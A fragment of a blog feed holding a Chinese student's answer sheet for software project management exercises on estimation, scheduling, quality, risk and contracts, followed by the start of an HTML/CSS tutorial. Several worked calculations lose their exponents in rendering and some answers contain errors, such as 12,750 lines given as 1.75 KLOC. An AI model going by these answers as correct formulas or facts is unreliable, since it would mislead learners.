它的结构是（B）<br>A.分层的集合结构 B.分级的树形结构 C.分层的线性结构 D.分级的图状结构</p><p>8.任务分解时，（B）方法从一般到特殊的方向进行，从项目的大局着手，然后逐步分解子细目，将项目变为更细、更完善的部分。<br>A.模板参照 B.自顶向下 C.类比 D.自底向上</p><p>四．问答题<br>1.试写出任务分解的方法和步骤。<br>答：任务分解的基本步骤：<br>1） 确认并分解项目的组成要素(WBS编号)。<br>2） 确定分解标准，按照项目实施管理的方法分解，而且分解的标准要统一。<br>3） 确认分解是否详细，是否可以作为费用和时间估计的标准，明确责任。<br>4） 确定项目交付成果（可以编制WBS字典）。<br>5） 验证分解正确性。验证分解正确后，建立一套编号系统。<br>任务分解方法：<br>1） 模板参照方法<br>2） 类比方法<br>3） 自上而下<br>4）自下而上</p><p>2.当项目过于复杂是，可以对项目进行任务分解，这样做的好处是什么？<br>答：将一个项目分解为更多的工作细目或者子项目，使项目变得更小、更易管理、更易操作，这样可以提高估算成本、时间和资源的准确性，使工作变得更易操作，责任分工更加明确。</p><h2 id="第六章"><a href="#第六章" class="headerlink" title="第六章"></a>第六章</h2><p>一、填空题。<br>1.软件项目成本包括直接成本和间接成本，一般而言，项目人力成本归属于（直接）成本。<br>2.再在项目初期，一般采用的成本估算方法是（类比估算法）。<br>3.功能点方法中5类功能组件的计数项是（外部输入）、（外部输出）、（外部查询）、（内部逻辑文件）、（外部接口文件）。<br>4.敏捷项目一般采用（故事点）估算方法。<br>5.（用例点）方法通过分析用例角色、场景和技术与环境因子等来进行软件估算。</p><p>二．判断题<br>1.故事点估算是一个相对的估算过程。（√）<br>2.在软件项目估算中，估算结果是没有误差的。（×）<br>3.人的劳动消耗所付出的代价是软件产品的主要成本。（√）<br>4.功能点估算与项目所使用的语言和技术有关。（×）<br>5.COCOMO81有3个等级的模型：有机型、嵌入型、半嵌入型。（×）<br>6.经验对于估算来说不重要。（×）<br>7.估算时既要考虑直接成本又要考虑间接成本。（√）<br>8.在进行软件估算的时候，可以直接考虑参照其他企业的模型进行项目估算。（×）<br>9间接成本是与一个具体项目相关的成本。（×）</p><p>三．选择题<br>1.三点估算法选择的3种估算值不包括（D）<br>A．最可能成本 B.最乐观成本 C.最悲观成本 D.项目经理估算值</p><p>2.下面关于估算的说法，错误的是（C）<br>A.估算是有误差的<br>B.估算时不要太迷信数学模型<br>C.经验对于估算来说不重要<br>D.历史数据对于估算来说非常重要</p><p>3.假设某项目的注册功能为3个故事点，而其中成绩录入工作量比注册功能工作量略多，如果采用Fibonacci 等级标准估算，则成绩录入功能的估算值的（A）<br>A．5个故事点 B.4个故事点 C.6个故事点 D.7个故事点</p><p>4.（B）是成本的主要因素，是成本估算的基础。<br>A.计划B.规模C.风险D.利润</p><p>5.常见的成本估算方法不包括（D）<br>A.代码行B.功能点C.类比法D.关键路径法</p><p>6.下列不是UFC的功能计数项是（C）<br>A.外部输出B.外部文件C.内部输出D.内部文件</p><p>7.成本预算的目的是（A）<br>A.生产成本基线B.编写报告书C.指导设计过程D.方便进度管理</p><p>8.下列不是软件项目规模单位的是（D）<br>A.源代码长度（LOC）B.功能点（FP）C.人天、人月、人年D.小时</p><p>9.在成本管理过程中，每个时间段中等各个工作单元的成本是（B）<br>A.估算B.预算C.直接成本D.间接成本</p><p>四．计算题。<br>1.项目经理正在进行一个图书馆信息查询系统的项目估算，他采用Delphi的专家估算方法，邀请了3位专家进行估算，第一位专家给出了2万元、7万元、12万元的估算值，第二位专家给出了4万元、6万元、8万元的估算值，第三位专家给出了2万元、6万元、10万元的估算值，试计算这个项目的成本估算值。</p><p>答：专家一：Ei=(ai+4mi+bi)/6=（2+4<em>7+12）/6=7<br>专家二：Ei=(ai+4mi+bi)/6=（4+4</em>6+8）/6=6<br>专家三：Ei=(ai+4mi+bi)/6=（2+4*6+10）/6=6<br>Ei=（7+6+6）/3=6.33（万元）</p><p>2.如果某软件公司正在进行一个项目，预计有50KLOC的代码量，项目是中等规模的半嵌入型的项目，采用中等COCOMO模型，项目属性中只有可靠性为很高级别（即取值为1.3），其他属性为正常（书上说，正常就是1），计算项目是多少人月的规模，如果是2万元/人月，则项目的费用是多少？</p><p>答：Effort=a<em>（KLOC）b<em>F<br>查表a=3，b=1.12，F=1<br>Effort=3.0</em>501.12<em>1.3</em>1=311.82（人月）<br>所以项目的费用为2</em> Effort=623.64万元</p><p>3.已知某项目使用C语言完成，该项目共有85个功能点，请用IBM模型估算源代码行数、工作量、项目持续时间、人员需要量以及文档数量。</p><p>答：C语言代码行与功能点的关系近似为150LOC/FP，所以，85个功能点代码行数为L85<em>150=12750行=1.75KLOC,则:工作量估算E=5.2</em>L0.91=5.2<em>12.750.91≈52.725（人月）<br>项目时间 D=4.1</em>L0.36=4.1<em>12.750.36≈10.25（月）<br>人员需求量S=0.54</em>E0.6=0.54<em>52.7250.6≈5.829（人）<br>文档数量 DOC=49</em>L1.01=49*12.751.01≈640.857（页）</p><h2 id="第七章"><a href="#第七章" class="headerlink" title="第七章"></a>第七章</h2><p>一、填空题</p><ol><li>（关键路径）决定了项目在给定的金钱关系和资源条件下完成项目所需的最短时间。</li><li>（时间）是一种特殊的资源，以其单向性、不可重复性、不可替代性而有别于其他资源。</li><li>在ADM网络图中，箭线表示（活动/任务）。</li><li>（应急法）和（平行作业法）都是时间压缩法。</li><li>工程评估评审技术采用加权平均的公式是（PERT历时=(O+P+4M)/6），其中O是乐观值，P是悲观值，M是最可能值。</li></ol><p>二、判断题</p><ol><li>一个工作也可以通过多个活动完成。（√）</li><li>在项目进行过程中，关键路径是不变的。（×）</li><li>在PDM网络图中，箭线表示的是任务之间的逻辑关系，节点表示的是活动。（√）</li><li>项目各项活动之间不存在相互联系与相互依赖关系。（×）</li><li>在资源冲突问题中，过度分配也属于资源冲突。（√）</li><li>浮动是在不增加项目成本的条件下，一个活动可以延迟的时间量。（×）</li><li>在使用应急法压缩时间时，不一定要在关键路径上选择活动来进行压缩。（×）</li><li>时间是项目规划中灵活性最小的因素。（√）</li><li>外部依赖关系又称强制性依赖关系，指的是项目活动与非项目互动之间的依赖关系。（×）</li><li>当估算某活动时间，存在很大不确定性时应采用CPM估计。（×）</li><li>敏捷项目一般采用远粗近细的计划模式，敏捷的发布计划相当于远期计划，迭代计划相当于近期计划（X）</li></ol><p>三. 选择题</p><ol><li><p>下面说法中不正确的是（D）<br>A．EF=ES+duration B. LS=LF-duration<br>C．TF=LS-ES=LF-EF D. EF=ES+lag</p></li><li><p>“软件编码完成之后，我才可以对它进行软件测试”，这句话说明了哪种依赖关系？（A）<br>A．强制性依赖关系 B.软逻辑关系 C.外部依赖关系 D.里程碑</p></li><li><p>（A）可以显示任务的基本信息，使用该类图能方便的查看任务的工期、开始时间、结束时间以及资源的信息。<br>A．甘特图 B.网络图 C.里程碑图 D. 资源图</p></li><li><p>（C）是项目冲突的主要原因，尤其在项目后期。<br>A．优先级问题 B.人力问题 C.进度问题 D. 费用问题</p></li><li><p>以下哪一项是项目计划中灵活性最小的因素？（A）<br>A．时间 B.人工成本 C.管理 D. 开发</p></li><li><p>以下哪一项不是任务之间的关系？（D）<br>A．结束-开始 B.开始-开始 C.结束-结束 D. 结束-开始-结束</p></li><li><p>快速跟进是指（A）<br>A．采用并行执行任务，加速项目进展 B. 用一个任务取代另外的任务<br>C. 如有可能，减少任务数量 D. 减轻项目风险</p></li><li><p>下面哪一项将延长项目的进度？（A）<br>A．lag B.lead C.赶工 D.快速跟进</p></li><li><p>下面哪一项可以决定进度的灵活性？（B）<br>A．PERT B.总浮动 C.ADM D. 赶工</p></li></ol><p>10.（B）可以表示敏捷项目的进度，并且可以表示出剩余的任务<br>A．燃起图 B.燃尽图 C.里程碑图 D.网络图</p><p>四. 问答题</p><ol><li><p>对一个任务进行进度估算时，A是乐观者，估计用6天完成，B是悲观者，估计用24天完成，C是有经验者，认为最有可能用12天完成，那么这个任务的历时估算介于10天到16天的概率是多少？<br>解：E=(6+24+4*12)/6=13， δ=(24-6)/6=3<br>E-δ=10<br>E+δ=16<br>所以任务历时估算介于10——16天的概率为：68.3%</p></li><li><p>请将下图所示的PDM（优先图法）网络图改画为ADM（箭线法）网络图。<br>图1</p></li></ol><p>解：上图对应的ADM图如下所示：<br>图2</p><p>3.根据下面任务流程图和下表给出的项目历时估算值，采用PERT方法估算，求出项目在14.57天内完成的概率的近似值。<br>图3</p><p>解：E1=(2+6+4<em>3)/6=20/6，E2=(4+8+4</em>6)/6=6，E3=(3+6+4*4)/6=25/6<br>任务方差、标准差分别为：<br>图4<br>所以，E= E1+ E2+ E3=13.5天，δ=1.07<br>E-δ=12.43，E+δ=14.57 [12.43，14.57]的概率为：68.3%<br>E-2δ=11.36，E+2δ=15.64 [11.36，15.64]的概率为：95.5%<br>E-3δ=10.29，E+3δ=16.71 [10.29，16.71]的概率为：99.7%<br>所以，项目在14.57天内完成的概率为：50%+68.3%/2=84.15%</p><h2 id="第八章"><a href="#第八章" class="headerlink" title="第八章"></a>第八章</h2><p>一、填空题<br>1、（审计）是对过程或产品的一次独立质量评估。<br>2、质量成本包括预防成本和（缺陷成本）。<br>3、（软件质量）是软件满足明确说明或者隐含的需求的程度。<br>4、McCall质量模型关注的3个方面是（产品运行）、（产品转移）、（产品修改）。<br>5、质量管理总是围绕着质量保证和（质量控制）过程两个方面进行。<br>6、质量保证的主要活动是（项目执行过程审计）和（项目产品审计）。</p><p>二、判断题<br>1、质量是满足要求的程度，包括符合规定的要求和客户隐含的需求。（√）<br>2、软件质量是软件满足明确说明或者隐含的需求的程度。（√）<br>3、软件质量可以通过后期测试得以提高。（×）<br>4、质量计划可以确定质量保证人员的特殊汇报渠道。（√）<br>5、软件质量是代码正确的程度。（×）<br>6、敏捷项目要求全程的质量审查（×）</p><p>三、选择题</p><p>1、下列不属于质量管理过程的是（D）<br>A 质量计划 B 质量保证 C 质量控制 D 质量优化</p><p>2、项目质量管理的目标是满足（C）的需要<br>A 老板 B 项目经理 C 项目 D 组织</p><p>3、下列属于质量成本的是（A）<br>A 预防成本 B 缺陷数量 C 预测成本 D 缺失成本</p><p>4、下列不是质量计划方法的是（C）<br>A 质量成本分析 B 因果分析图 C 抽样分析 D 基准对照</p><p>5、下列不是软件质量模型的是（D）<br>A Boehm质量模型 B McCall 质量模型 C ISO/IEC 9216质量模型 D Mark质量模型</p><p>6、质量控制非常重要，但是进行质量控制也需要一定的成本，（B）可以降低质量控制的成本。<br>A 进行过程分析 B 使用抽样统计 C 对全程进行监督 D 进行质量审计</p><p>7、McCall 质量模型不包含（C）<br>A 产品修改 B 产品转移 C 产品特点 D 产品运行</p><p>8、下面（D）不是敏捷项目的质量实践<br>A.结对编程 B.TDD C.迭代评审 D.需求规格编写过程审计</p><p>四、问答题</p><p>1、简述质量保证的主要活动，以及质量保证的要点。<br>答：质量保证的主要活动是项目执行过程审计和项目产品审计。<br>质量保证的要点是：对项目进行评价、推测能否达到质量指标、建立对项目的信心</p><p>2、简述质量保证与质量控制的关系。<br>答：质量保证（QA）是通过评价项目整体绩效,建立对质量要求的信任，提供项目和产品可视化的管理报告。这个任务本身并不能提高产品的质量，但是通过质量保证的一系列工作可以间接地提高产品的质量。质量保证一般由质量保证部门人员实施。</p><p>质量控制（QC）是确定项目结果与质量标准是否相符,同时,确定消除不符的原因和方法，它控制产品的质量，及时纠正缺陷。这个任务本身提高产品的质量，一般由开发人员实施。</p><p>质量保证是后期质量活动，质量控制是前期质量活动。它们是有区别的:质质量保证是针对项目实施过程的管理手段，质量控制是针对项目产品的技术手段;实施质量保证是针对过程改进和审计的，强调的是过程改进和信心保证。实施质量控制是按照质量要求，检查具体可交付成果的质量，强调的是具体的可交付成果。</p><h2 id="第九章"><a href="#第九章" class="headerlink" title="第九章"></a>第九章</h2><p>一、填空题<br>1、（完整性和可跟踪性）是软件配置管理的核心功能。<br>2、（基线）标志开发过程中一个阶段的结束和里程碑。<br>3、 基线变更控制包括（变更请求）、（变更控制）、（变更批准/拒绝）、（变更实现）等步骤。<br>4、（版本管理）、（变更管理）是配置管理的主要功能。<br>5、基线变更时，需要经过（SCCB）授权。<br>6、SCCB的全称是（软件配置控制委员会）。</p><p>二、 判断题<br>1、一个软件配置项可能有多个标识。（×）<br>2、基线提供了软件开发阶段的一个特定点。（×）<br>3、有效的项目管理能够控制变化，以最有效的手段应对变化，不断命中移动的目标。（√）<br>4、 一个（些）配置项形成并通过审核，即形成基线。（√）<br>5、软件配置项是项目需定义其受控于软件配置管理的款项，每个项目的配置项是相同的。（×）<br>6、基线的修改不需要每次都按照正式的程序执行。（×）<br>7、基线产品是不能修改的。（×）</p><p>8、基线修改应受到控制，但不一定要经SCCB授权。（×）<br>9、变更控制系统包括从项目变更申请、变更评估、变更审批到变更实施的文档化流程。（√）<br>10、持续支付领域强调对项目所有的相关产物及其之间的关系都要进行有效配置管理（对）<br>11、持续支付更倾向于使用基于分支的开发模式（错）</p><p>三、 选择题<br>1、 下列不属于SCCB的职责的是（D）<br>A 评估变更 B 与项目管理层沟通 C 对变更进行反馈 D 提出变更申请</p><p>2、为了更好地管理变更，需要定义项目基线，关于基线的描述，下列描述正确的是（B）<br>A 不可变化<br>B 可以变化，但是必须通过基线变更控制流程处理<br>C 所以的项目必须定义基线<br>D 基线发生变更时，必须修改需求</p><p>3、软件配置管理无法确保以下哪种软件产品属性（A）<br>A 正确性 B 完整性 C 一致性 D 可控性</p><p>4、变更控制需要关注的是（B）<br>A 阻止变更 B 标识变更，提出变更，管理变更<br>C 管理SCCB D 客户的想法</p><p>4、以下哪项不是项目配置管理中可能遇到的问题？（B）<br>A 找不到某个文件的历史版本<br>B 甲方与乙方在资金调配上存在意见差异<br>C 开发人员未经授权修改代码或文档<br>D 因协同开发中，或者异地开发，版本变更混乱导致整个项目失败</p><p>5、以下哪项不属于软件项目配置管理的问题（B）<br>A.找不到某个文件的历史版本<br>B.甲方和乙方在资金调配上存在意见差异<br>C.开发人员未经授权修改代码或文档<br>D.因协同开发中，或者异地开发，版本变更混乱导致整个项目失败</p><p>四、简答题<br>1、 写出配置管理的基本过程。<br>答：（1）配置项标识、跟踪；（2）配置管理环境建立；（3）基线变更管理；（4）配置管理审计；（5）配置状态统计；（6）配置管理计划。</p><p>2、 说明软件配置控制委员会（SCCB）的基本职责。<br>答：评估变更、批准变更申请、在生存期内规范变更申请流程、对变更进行反馈、与项目管理层沟通。</p><p>3、 写出几个常见的软件配置项。<br>答：软件项目计划、需求分析结果、软件需求规格说明书、设计规格说明书、源代码清单、厕所规格说明书、测试计划、测试用例与实验结果、可执行程序、用户手册、维护文档。</p><h2 id="第十章"><a href="#第十章" class="headerlink" title="第十章"></a>第十章</h2><p>一、填空<br>1、 可以充分发挥部门资源优势集中的组织结构为（职能型组织结构）<br>2、 组织结构的主要类型（职能型）、（项目型）、（矩阵型）<br>3、 （会议形式）沟通最有可能协助解决复杂的问题。<br>4、 当项目中有20个人时，沟通渠道最多有（190）。</p><p>二、判断<br>1、项目干系人是项目计划的一部分。（√）<br>2、项目型的优点是可以资源共享。（×）<br>3、应尽量多建立一些沟通渠道。(×)<br>4、项目沟通的基本原则是及时性、准确性、完整性和可理解性(√)<br>5、在IT项目中，成功的最大威胁是沟通的失败(√)<br>6、责任分配矩阵是明确项目团队成员的角色与职责的有效工具(√)<br>7、口头沟通不是项目沟通的方式(×)<br>8、对于紧急的信息，应该通过口头的方式沟通；对于重要的信息，应采用书面的方式沟通(√)<br>9、沟通计划包括确定谁需要信息，需要什么信息，何时需要信息，以及如何接收信息等(√)<br>10、敏捷团队的人员一般在3~9人，而且一般集中地在一个场地开发，可以围坐一个桌子开会（√）</p><p>三、选择<br>1、（A）以图形方式展示项目团队成员及其报告关系这样可以减少沟通渠道，减少成本<br>A、项目组织图 B、甘特图 C、网络图 D、RAM图</p><p>2、下面不是敏捷角色的是（D）<br>A、产品负责人 B、团队促进者 C、跨职能团队成员 D、合同管理者</p><p>3、在项目管理的3种组织结构中，适用于主要由一个部门完成的项目或技术比较成熟的项目组织结构是( C)<br>A矩阵型组织结构 B项目型组织结构 C职能型组织结构 D都一样</p><p>4、项目经理花在沟通上的时间是(B)<br>A、20%-40% B、75%-90% C、60% D、 30%-60%</p><p>5、在（C）组织结构中，项目成员没有安全感<br>A职能型B矩阵型C项目型D弱矩阵型</p><p>6、下列关于干系人的描述中，不正确的是（D）<br>A影响项目决策的个人、群体或者组织<br>B影响项目活动的个人、群体或者组织<br>C影响项目结果的个人、群体或者组织<br>D所有项目人员</p><p>7、编制沟通计划的基础是( A)<br>A沟通需求分析B项目范围说明书C项目管理计划D历史资料</p><p>8、项目团队原来有5个成员，现在人员扩充，又增加了3个成员这样沟通渠道增加了（A）<br>A、2.8倍 B、两倍 C、4倍 D、1.6倍</p><p>9、对于项目中比较重要的通知，最好采用（B）沟通方式<br>A口头B书面C网络方式D电话</p><p>10、在一个高科技公司，项目经理正在为一个新的项目选择合适的组织结构，这个项目涉及多的领域和特性，他应该选择（A）组织结构<br>A矩阵型B项目型C职能型D组织型</p><p>三、简答题<br>1、 写出5种以上项目沟通方式 P217<br>沟通方式主要有书面沟通和口头沟通、语言沟通和非语言沟通、正式沟通和非正式沟通、单向沟通和双向沟通、网络沟通等</p><p>2、 对于特别重要的内容，你认为一般采用哪些方式才能确保有效沟通 P220<br>对于特别重要的内容，要采用多种方式进行有效沟通确保传达到位，除发送邮件外还要电话提醒、回执等，重要的内容还要通过举行各种会议进行传达</p><h2 id="第十一章"><a href="#第十一章" class="headerlink" title="第十一章"></a>第十一章</h2><p>一、填空题<br>1.风险评估的方法包括（定性）和定量风险分析。<br>2.决策树分析是一种（形象化的图表分析）方法。<br>3.项目风险的三要素是（风险事件）、（风险事件发生的概率）、（风险造成的影响）。<br>4.（回避）风险是指尽可能地规避可能发生的风险，采取主动放弃或者拒绝使用导致风险的方案。<br>5.定量风险评估主要包括（访谈）、（盈亏平衡分析）、（决策树分析）、（模拟法）、（敏感性分析）等方法。</p><p>二、判断题<br>1.任何项目都是有风险的。（√）<br>2.风险是损失发生的不确定性，是对潜在的、未来可能发生损害的一种度量。（×）<br>3.风险识别、风险评估、风险规划、风险控制是风险管理的4个过程。（√）<br>4.应对风险的常见策略是回避风险、转移风险、损失控制和自留风险。（√）<br>5.项目的风险几乎一样。（×）<br>6.购买保险是一种回避风险的应对策略（×）<br>7.敏捷项目没有长期计划，这本身也是一个风险，因为存在一些无法识别的风险。（错）</p><p>三、选择题<br>1.下列不属于项目风险的三要素的是（B）。<br>A.一个事件 B.事件的产生原因 C.事件发生的概率 D.事件的影响</p><p>2.下列属于可预测风险的是（C）。<br>A.不现实的交付时间 B.没有需求或软件范围的文档 C.人员调整 D.恶略的开发环境</p><p>3.下列不是风险管理过程的是（D）<br>A.风险评估 B.风险识别 C.风险规划 D.风险收集</p><p>4.下列说法错误的是（D）。<br>A.项目风险的3个要素是一个事件、事件发生的概率、事件的影响<br>B.风险规划的4个过程是风险识别、风险评估、风险规划、风险控制<br>C.风险规划的主要策略是回避风险、转移风险、损失控制、自留风险<br>D.项目风险是由风险发生的可能性决定的</p><p>5.在一个项目的开发过程中采用了新的技术，为此，项目经理找来专家对项目组人员进行技术培训，这是什么风险应对策略？（B）。<br>A.回避风险 B.损失控制 C.转移风险 D.自留风险</p><p>6.下列不属于风险评估方法的是（D）。<br>A.盈亏平衡分析 B.模拟法 C.决策树分析 D.二叉树分析</p><p>四、问答题<br>1.一个项目在进行规划的时候，碰到了一个风险问题，项目经理决定是否采用方案A。如果采用方法A需要使用一个新的开发工具，而能够掌握这个工具的概率是30%，通过使用这个工具可以获利5万元，如果采用方案A而不能掌握这个工具，将损失1万元。利用决策树分析技术说明这个项目经理是否应该采用这个方案A？（绘制决策树）<br>图5</p><p>通过上面分析可知，应该采用方案A。</p><p>2.某企业在今年有甲乙两种产品方案可以选择，每种方案的状态、收益和概率如表11-11所示，绘制决策树时，判断哪种方案将有更大收益。<br>图6~8</p><h2 id="第十二章"><a href="#第十二章" class="headerlink" title="第十二章"></a>第十二章</h2><p>一、 填空</p><ol><li>为执行项目而从项目团队外获取产品、服务或者成果的过程称为：（采购）</li><li>合同双方当事人承担不同角色，这些角色包括：（甲方）、（乙方）</li><li>一个CPFF合同类型，估计成本是10万元，固定费用是成本1.5万元，当成本提高至20万元是，合同金额为：（21.5万元）</li></ol><p>二、 判断</p><ol><li>软件项目外包的实质是软件开发过程从公司内部部分或者全部延伸到公司外部的过程（×）</li><li>对于甲方来说，风险最高的是CPCC合同类型，风险最低的是FFP合同类型，乙方则相反（√）</li><li>如果一个项目的合同类型是固定价格（FFP），合同价格是100万元，实际花费是160万元，则项目结算金额为160万元（×）</li><li>成本加激励费用（CPIF）合同居有激励机制（√）</li><li>《敏捷宣言》认为“客户协作高于合同协商”（√）</li></ol><p>三、 选择<br>1、 下列合同类型中，卖方承担的风险最大的是（D）<br>A.成本加成本百分比 B.成本加固定费 C.成本加奖金 D. 固定价格</p><p>2、 某项目采用成本加奖金的成本补偿类合同，当预算成本为20万元，利润4万元，且奖励分配为80/20时，如果实际成本降至16万元，则项目总价为（C）。<br>A.24万元 B.23.2万元 C.20.8万元 D.20万元</p><p>3、 合同是需要靠（D）约束的。<br>A.双方达成的共识 B.道德 C.责任 D.相关法律法规</p><p>4、下面哪项不是敏捷项目设计的动态特性的合同签署技术（D ）<br>A.多层结构 B.总结增量 C.动态范围方案 D.固定价格</p><h2 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h2><p><img src="https://raw.githubusercontent.com/NoOne-hub/picture/master/img/20191210113504.png" alt></p><p><img src="https://raw.githubusercontent.com/NoOne-hub/picture/master/img/20191210113520.png" alt></p><p><img src="https://raw.githubusercontent.com/NoOne-hub/picture/master/img/20191210113542.png" alt></p><p><img src="https://raw.githubusercontent.com/NoOne-hub/picture/master/img/20191210113617.png" alt></p><p><img src="https://raw.githubusercontent.com/NoOne-hub/picture/master/img/20191210113629.png" alt></p><p><img src="https://raw.githubusercontent.com/NoOne-hub/picture/master/img/20191210113652.png" alt></p><p><img src="https://i.loli.net/2019/12/10/MXrGjztnlLHVSPk.png" alt="20191210113824"></p><p><img src="https://raw.githubusercontent.com/NoOne-hub/picture/master/img/20191210114903.png" alt></p><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/undefined/">https://noone-hub.github.io/posts/undefined/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <tags>
        <tag>软件项目管理， 考试</tag>
      </tags>
  </entry>
  <entry>
    <title>html+css基础学习</title>
    <url>/posts/909026e/</url>
    <content><![CDATA[<h1 id="html-css基础"><a href="#html-css基础" class="headerlink" title="html+css基础"></a>html+css基础</h1><h2 id="html基础"><a href="#html基础" class="headerlink" title="html基础"></a>html基础</h2><h3 id="head头配置"><a href="#head头配置" class="headerlink" title="head头配置"></a>head头配置</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>/&gt;</span> <span class="comment">&lt;!-- 告诉浏览器用utf-8解析--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>常用标签<span class="tag">&lt;/<span class="name">title</span>&gt;</span> <span class="comment">&lt;!--head头的标题--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"keywords"</span> <span class="attr">content</span>=<span class="string">"前端"</span>/&gt;</span> <span class="comment">&lt;!--meta可以作为关键字查询--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"description"</span> <span class="attr">content</span>=<span class="string">"网页描述"</span>/&gt;</span> <span class="comment">&lt;!--meta可以指定网页描述--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"refresh"</span> <span class="attr">content</span>=<span class="string">"5;url=http://www.baidu.com"</span> /&gt;</span></span><br><span class="line"><span class="comment">&lt;!--重定向请求--&gt;</span></span><br></pre></td></tr></table></figure><a id="more"></a><!-- build time:Sat Dec 28 2019 22:32:14 GMT+0800 (China Standard Time) --><h3 id="特殊字符"><a href="#特殊字符" class="headerlink" title="特殊字符"></a>特殊字符</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&amp;lt <span class="comment">&lt;!--&lt;号或小于号--&gt;</span></span><br><span class="line">&amp;gt <span class="comment">&lt;!--&gt;号或大于号--&gt;</span></span><br><span class="line">&amp;nbsp; <span class="comment">&lt;!--英文空格--&gt;</span></span><br><span class="line">&amp;emsp; <span class="comment">&lt;!--中文空格--&gt;</span></span><br><span class="line">&amp;copy; <span class="comment">&lt;!--版权符号 @copy--&gt;</span></span><br></pre></td></tr></table></figure><h3 id="input部分"><a href="#input部分" class="headerlink" title="input部分"></a>input部分</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> /&gt;</span> <span class="comment">&lt;!--这个是单选框--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span>/&gt;</span> <span class="comment">&lt;!--多选--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span>/&gt;</span> <span class="comment">&lt;!--密码框--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">placeholder</span>=<span class="string">"用户名"</span>/&gt;</span> <span class="comment">&lt;!--文本框，默认填充为用户名，提示--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"email"</span>/&gt;</span> <span class="comment">&lt;!--email--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"range"</span>/&gt;</span> <span class="comment">&lt;!--可拖动的进度条--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"date"</span>/&gt;</span> <span class="comment">&lt;!--时间--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"image"</span> <span class="attr">src</span>=<span class="string">"download.img"</span>/&gt;</span> <span class="comment">&lt;!--图片，点击可以提交--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">"username"</span> <span class="attr">type</span>=<span class="string">"text"</span>/&gt;</span> <span class="comment">&lt;!-- for 标签可以点击的时候转到指定id处--&gt;</span></span><br></pre></td></tr></table></figure><h3 id="其他标签"><a href="#其他标签" class="headerlink" title="其他标签"></a>其他标签</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"username"</span>&gt;</span><span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">fieldset</span>&gt;</span><span class="tag">&lt;/<span class="name">fieldset</span>&gt;</span> <span class="comment">&lt;!-- 这个是用于表单分组--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">legend</span>&gt;</span>用户名<span class="tag">&lt;/<span class="name">legend</span>&gt;</span> <span class="comment">&lt;!-- 子标签--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textarea</span>&gt;</span>内容<span class="tag">&lt;/<span class="name">textarea</span>&gt;</span> <span class="comment">&lt;!--多行文本框--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span> <span class="comment">&lt;!-- 有6级 h1-h6 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span> <span class="tag">&lt;/<span class="name">p</span>&gt;</span> <span class="comment">&lt;!-- 段落--&gt;</span></span><br></pre></td></tr></table></figure><h3 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h3><h6 id="图片代码"><a href="#图片代码" class="headerlink" title="图片代码"></a>图片代码</h6><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"1.gif"</span> <span class="attr">alt</span>=<span class="string">"这是一个大松树"</span> <span class="attr">width</span>=<span class="string">"200px"</span> <span class="attr">height</span>=<span class="string">"100px"</span> /&gt;</span> </span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">alt是作为图片不能显示时候的描述</span></span><br><span class="line"><span class="comment">width 宽度</span></span><br><span class="line"><span class="comment">height 高度</span></span><br><span class="line"><span class="comment">只设置一个，另一个也会等比例修改</span></span><br><span class="line"><span class="comment">图片建议美工，不要修改宽比</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure><h6 id="相对路径"><a href="#相对路径" class="headerlink" title="相对路径"></a>相对路径</h6><p>相对于运行的html的路径</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">- index.html</span><br><span class="line">-- img</span><br><span class="line">   --- 1.jpg</span><br></pre></td></tr></table></figure><p>index.html 就可以用 img/1.jpg这种路径</p><h6 id="图片类型"><a href="#图片类型" class="headerlink" title="图片类型"></a>图片类型</h6><ol><li>jpeg支持颜色较多，图片可以压缩，不支持透明</li><li>gif支持颜色少，支持动态图，支持简单透明</li><li>png支持颜色多，并支持复杂透明，通常用png</li></ol><h3 id="内联框架"><a href="#内联框架" class="headerlink" 